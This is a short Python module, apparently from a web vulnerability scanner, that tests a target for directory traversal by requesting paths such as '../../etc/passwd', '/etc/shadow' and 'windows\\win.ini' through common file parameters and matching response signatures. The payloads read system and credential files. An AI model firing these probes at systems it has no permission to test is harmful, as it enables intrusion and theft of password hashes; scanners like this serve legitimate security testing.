# app/scans/directory_traversal.py
SCAN_NAME = "Directory & File Enumeration"

import httpx
from typing import List

PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "..\\..\\..\\windows\\win.ini",
    "../../../../../../etc/shadow",
]

PATHS = [
    "/?file=",
    "/?name=",
    "/download?file=",
    "/view?name=",
    "/static/?path=",
]

INDICATORS = {
    "passwd": "root:x:0:0:",
    "shadow": ":$6$",
    "win.ini": "[fonts]",
}

async def run(target: str, client: httpx.AsyncClient) -> List[str]:
    findings: List[str] = []
    base = target.rstrip('/')
    for base_path in PATHS:
        for payload in PAYLOADS:
            url = base + base_path + payload
            try:
                resp = await client.get(url)
                body = resp.text.lower()
                for label, signature in INDICATORS.items():
                    if signature.lower() in body:
                        findings.append(f"Possible directory traversal: fetched {label} via {url}")
            except Exception as e:
                findings.append(f"Error during traversal test ({url}): {e}")
    return findings
